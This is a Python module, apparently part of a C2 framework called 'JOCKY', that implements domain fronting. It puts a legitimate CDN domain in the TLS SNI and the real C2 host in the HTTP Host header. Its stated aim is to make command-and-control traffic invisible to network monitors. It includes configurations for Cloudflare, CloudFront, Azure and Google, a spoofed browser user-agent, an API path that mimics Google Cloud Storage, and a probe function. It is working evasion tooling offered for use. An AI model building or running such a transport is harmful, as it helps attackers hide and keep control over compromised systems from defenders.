"""
JOCKY Domain Fronting Transport — Phase 14
===========================================
Routes C2 traffic through CDN infrastructure using domain fronting.

Domain fronting technique:
  - TLS SNI (Server Name Indication) contains a legitimate CDN domain
    (e.g. allowed.cloudflare.com) — visible to network monitors
  - HTTP Host header contains the actual C2 domain
    (e.g. jocky-c2.example.com) — only visible inside the TLS tunnel
  - CDN routes the request to the actual backend based on Host header
  - Network monitors see only CDN traffic — C2 traffic is invisible

Supported CDN providers:
  - Cloudflare (Workers)
  - AWS CloudFront
  - Azure CDN
  - Google Cloud CDN (via googleapis.com fronting)

Usage:
    router = DomainFrontingRouter(
        front_domain="allowed.cloudflare.com",
        real_host="jocky-c2.yourdomain.com",
        cdn_provider="cloudflare",
    )
    response = await router.post("/api/results", data={"key": "value"})
"""

from __future__ import annotations

import asyncio
import json
import ssl
import time
from dataclasses import dataclass
from typing import Any

try:
    import aiohttp
    _AIOHTTP_OK = True
except ImportError:
    _AIOHTTP_OK = False


# ─── CDN provider configurations ──────────────────────────────────────────────

CDN_CONFIGS: dict[str, dict] = {
    "cloudflare": {
        "front_ip":    "104.16.0.0",   # Cloudflare anycast range
        "front_port":  443,
        "path_prefix": "",
    },
    "cloudfront": {
        "front_ip":    "13.32.0.0",    # AWS CloudFront range
        "front_port":  443,
        "path_prefix": "",
    },
    "azure": {
        "front_ip":    "13.107.42.0",  # Azure CDN range
        "front_port":  443,
        "path_prefix": "",
    },
    "google": {
        "front_ip":    "142.250.0.0",  # Google CDN range
        "front_port":  443,
        "path_prefix": "/upload/storage/v1",  # Mimics Google Cloud Storage API
    },
}


@dataclass
class FrontingRequest:
    """A single domain-fronted HTTP request."""
    method:   str
    path:     str
    data:     dict | None
    headers:  dict
    response: dict | None = None
    error:    str  | None = None
    latency_ms: float = 0.0


class DomainFrontingRouter:
    """
    Routes HTTP requests through CDN domain fronting.

    Parameters
    ----------
    front_domain  : str   Legitimate CDN domain (goes in TLS SNI)
    real_host     : str   Actual C2 backend domain (goes in HTTP Host header)
    cdn_provider  : str   CDN provider key (cloudflare, cloudfront, azure, google)
    timeout       : float Request timeout in seconds
    """

    def __init__(
        self,
        front_domain:  str,
        real_host:     str,
        cdn_provider:  str  = "cloudflare",
        timeout:       float = 30.0,
    ) -> None:
        self.front_domain = front_domain
        self.real_host    = real_host
        self.cdn_config   = CDN_CONFIGS.get(cdn_provider, CDN_CONFIGS["cloudflare"])
        self.timeout      = timeout
        self._session     = None

    # ─── Public API ───────────────────────────────────────────────────────────

    async def post(self, path: str, data: dict) -> dict:
        """Send a POST request via domain fronting."""
        return await self._request("POST", path, data)

    async def get(self, path: str) -> dict:
        """Send a GET request via domain fronting."""
        return await self._request("GET", path, None)

    async def close(self) -> None:
        """Close the underlying HTTP session."""
        if self._session and _AIOHTTP_OK:
            await self._session.close()
            self._session = None

    # ─── Request execution ────────────────────────────────────────────────────

    async def _request(self, method: str, path: str, data: dict | None) -> dict:
        if not _AIOHTTP_OK:
            raise RuntimeError(
                "aiohttp not installed. Run: pip install aiohttp\n"
                "Domain fronting transport requires aiohttp."
            )

        # Build the fronted URL:
        # - Connect to front_domain (CDN edge)
        # - But send Host: real_host (CDN routes to our backend)
        prefix = self.cdn_config.get("path_prefix", "")
        url    = f"https://{self.front_domain}{prefix}{path}"

        headers = {
            "Host":         self.real_host,          # ← the fronting magic
            "Content-Type": "application/json",
            "User-Agent":   "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                            "AppleWebKit/537.36 (KHTML, like Gecko) "
                            "Chrome/120.0.0.0 Safari/537.36",
            "Accept":       "application/json",
        }

        # TLS context: verify against front_domain cert (legitimate CDN cert)
        ssl_ctx = ssl.create_default_context()

        t0 = time.monotonic()
        try:
            session = await self._get_session()
            async with session.request(
                method, url,
                headers = headers,
                json    = data,
                ssl     = ssl_ctx,
                timeout = aiohttp.ClientTimeout(total=self.timeout),
            ) as resp:
                latency = (time.monotonic() - t0) * 1000
                body    = await resp.json()
                return {
                    "status":     resp.status,
                    "data":       body,
                    "latency_ms": round(latency, 2),
                    "fronted_via": self.front_domain,
                }
        except Exception as exc:
            latency = (time.monotonic() - t0) * 1000
            return {
                "status":     -1,
                "error":      str(exc),
                "latency_ms": round(latency, 2),
            }

    async def _get_session(self):
        """Lazily create and reuse the aiohttp session."""
        if self._session is None or self._session.closed:
            connector = aiohttp.TCPConnector(ssl=False)
            self._session = aiohttp.ClientSession(connector=connector)
        return self._session

    # ─── Context manager ──────────────────────────────────────────────────────

    async def __aenter__(self):
        return self

    async def __aexit__(self, *args):
        await self.close()


# ─── Utility: detect CDN fronting capability ──────────────────────────────────

async def probe_fronting(front_domain: str, real_host: str) -> bool:
    """
    Test whether domain fronting is working for the given front/real pair.

    Returns True if the CDN successfully routes to the real host.
    """
    if not _AIOHTTP_OK:
        return False

    router = DomainFrontingRouter(front_domain, real_host)
    try:
        result = await router.get("/health")
        return result.get("status") == 200
    except Exception:
        return False
    finally:
        await router.close()
